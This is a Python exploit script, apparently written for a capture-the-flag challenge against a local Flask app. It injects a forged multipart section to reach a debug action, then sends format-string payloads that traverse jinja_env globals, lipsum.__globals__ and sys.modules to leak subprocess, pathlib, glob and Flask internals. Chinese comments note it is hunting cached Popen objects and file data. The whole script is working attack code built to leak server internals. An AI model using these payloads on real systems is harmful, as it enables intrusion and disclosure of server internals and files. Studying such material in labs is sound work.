import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def format_string_leak(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=10.0)
    return r.text.strip()

# 探索 subprocess 模块 - 可能有缓存的 Popen 对象
payloads = [
    # subprocess 的全局变量
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[subprocess]._active}', 'subprocess._active'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[subprocess]._cleanup}', 'subprocess._cleanup'),
    
    # pathlib 的实例可能存在
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[pathlib].Path}', 'pathlib.Path class'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[pathlib].PurePath}', 'pathlib.PurePath'),
    
    # glob 的缓存
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[glob].glob}', 'glob.glob function'),
    
    # 查看 flask 是否有缓存的文件信息
    ('{0.static_folder}', 'static_folder'),
    ('{0.jinja_env.loader._filesystem_loader}', 'filesystem loader'),
    
    # 检查 httpx 是否有缓存的响应
    ('{0.view_functions[action].__globals__[httpx].Client}', 'httpx.Client'),
    
    # 检查 werkzeug 的文件系统工具
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[werkzeug.utils]}', 'werkzeug.utils'),
    
    # 检查 io 模块
    ('{0.view_functions[action].__globals__[BytesIO]}', 'BytesIO class'),
    
    # 检查 flask.helpers
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[flask.helpers]}', 'flask.helpers'),
]

for p, desc in payloads:
    try:
        result = format_string_leak(p)
        result = result[:3000] if len(result) > 3000 else result
        print(f"[{desc}]: {result}\n")
    except Exception as e:
        print(f"[{desc}]: Error - {e}\n")
